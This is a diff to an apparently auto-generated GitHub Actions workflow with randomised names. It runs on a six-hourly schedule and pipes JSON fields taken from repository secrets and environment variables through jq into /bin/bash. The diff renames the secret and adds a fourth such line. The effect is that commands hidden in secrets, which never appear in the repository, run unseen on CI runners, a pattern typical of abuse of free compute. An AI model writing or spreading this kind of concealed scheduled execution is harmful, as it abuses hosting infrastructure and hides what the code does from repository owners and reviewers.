@@ -1,20 +1,20 @@
 name: wzhekplx
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '4 4/6 * * *'
-jobs:  # 14909
+    - cron: '4 0/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: wzhekplx
         env:
-          rlaod51: ${{ secrets.rlaod51 }}
+          mygua59882: ${{ secrets.mygua59882 }}
         run: |
-          echo $rlaod51 | jq -r .bmchs9355 | /bin/bash
-          echo $glhp964 | jq -r .lgin5127 | /bin/bash
-          echo $mulzs4823 | jq -r .whpke67062 | /bin/bash
+          echo $mygua59882 | jq -r .i22751 | /bin/bash
+          echo $zllyk4327 | jq -r .grwa26958 | /bin/bash
+          echo $wqnfh8413 | jq -r .cxdvg5 | /bin/bash
+          echo $naks8200 | jq -r .rgin3012 | /bin/bash
 
